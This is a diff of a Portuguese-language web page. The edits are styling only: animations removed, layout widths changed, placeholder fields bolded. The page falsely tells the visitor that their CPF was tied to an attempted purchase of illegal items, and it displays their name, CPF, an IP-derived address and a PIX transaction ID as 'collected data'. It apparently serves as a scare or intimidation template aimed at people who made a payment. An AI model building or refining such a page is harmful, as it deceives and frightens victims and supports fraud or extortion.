@@ -12,13 +12,13 @@
       cursor: none !important;
     }
     
-    body {
+    html, body {
       background: #000000;
       color: #ffffff;
       font-family: 'Courier New', monospace;
       font-size: 16px;
       line-height: 1.4;
-      min-height: 100vh;
+      height: auto;
       overflow-x: hidden;
       overflow-y: auto;
       display: flex;
@@ -36,7 +36,7 @@
     
     .central-rectangle {
       width: 80%;
-      max-width: 800px;
+      max-width: 90vw;
       border: 1px solid #cccccc;
       padding: 16px;
       margin: auto;
@@ -50,12 +50,6 @@
       color: #ff0000;
       margin-bottom: 30px;
       text-align: center;
-      animation: slowBlink 2s infinite;
-    }
-    
-    @keyframes slowBlink {
-      0%, 50% { opacity: 1; }
-      51%, 100% { opacity: 0.3; }
     }
     
     .intro-text {
@@ -75,6 +69,10 @@
     .data-line {
       margin: 10px 0;
       font-size: 16px;
+    }
+    
+    .data-value {
+      font-weight: bold;
     }
     
     .server-msg {
@@ -135,21 +133,6 @@
       text-align: center;
     }
     
-    /* Screen flash effect */
-    @keyframes screenFlash {
-      0%, 97% { 
-        border: none;
-      }
-      98%, 100% { 
-        border: 2px solid #ff0000;
-        box-shadow: 0 0 10px #ff0000;
-      }
-    }
-    
-    body {
-      animation: screenFlash 4s infinite;
-    }
-    
     /* Mobile responsiveness */
     @media (max-width: 768px) {
       body {
@@ -158,8 +141,8 @@
       }
       
       .central-rectangle {
-        width: 90%;
-        padding: 12px;
+        width: 90vw;
+        padding: 16px;
       }
       
       .main-title {
@@ -194,16 +177,16 @@
     </div>
     
     <div class="intro-text">
-      Olá, <span id="nome-cliente">[NOME_DO_CLIENTE]</span><br>
-      Seu CPF <span id="cpf-cliente">[CPF_DO_CLIENTE]</span> foi vinculado à tentativa de compra de itens ilegais.
+      Olá, <span class="data-value" id="nome-cliente">[NOME_DO_CLIENTE]</span><br>
+      Seu CPF <span class="data-value" id="cpf-cliente">[CPF_DO_CLIENTE]</span> foi vinculado à tentativa de compra de itens ilegais.
     </div>
     
     <div class="data-section">
       <div style="margin-bottom: 15px; font-weight: bold;">Dados coletados:</div>
-      <div class="data-line">- Nome completo: <span id="nome-completo">[NOME_DO_CLIENTE]</span></div>
-      <div class="data-line">- CPF: <span id="cpf-completo">[CPF_DO_CLIENTE]</span></div>
-      <div class="data-line">- Endereço (via IP): <span id="ip-cliente">[IP_DO_CLIENTE]</span></div>
-      <div class="data-line">- end_to_end_id: <span id="end-to-end-cliente">[ID_PIX_CLIENTE]</span></div>
+      <div class="data-line">- Nome completo: <span class="data-value" id="nome-completo">[NOME_DO_CLIENTE]</span></div>
+      <div class="data-line">- CPF: <span class="data-value" id="cpf-completo">[CPF_DO_CLIENTE]</span></div>
+      <div class="data-line">- Endereço (via IP): <span class="data-value" id="ip-cliente">[IP_DO_CLIENTE]</span></div>
+      <div class="data-line">- end_to_end_id: <span class="data-value" id="end-to-end-cliente">[ID_PIX_CLIENTE]</span></div>
     </div>
     
     <div class="server-msg">
